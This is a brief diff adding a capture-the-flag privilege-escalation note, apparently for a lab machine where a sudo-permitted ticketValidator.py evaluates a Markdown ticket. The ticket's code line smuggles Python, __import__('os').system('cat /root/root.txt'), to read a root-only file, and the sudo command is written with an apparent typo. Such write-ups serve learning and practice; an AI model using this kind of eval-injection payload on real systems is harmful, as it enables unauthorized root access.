@@ -1,0 +1,14 @@
+######################## GETTING ROOT ############################
+
+sudo -L
+
+we can execute python3 /opt/skytrain_inc/ticketValidator.py
+
+the ticket is in format  filename.md: 
+
+# Skytrain Inc 
+## Ticket to 
+__Ticket Code:__
+**102+ 10 == 112 and __import__('os').system('cat /root/root.txt') == False
+
+OSS: note that after Ticket to there's a blank space.
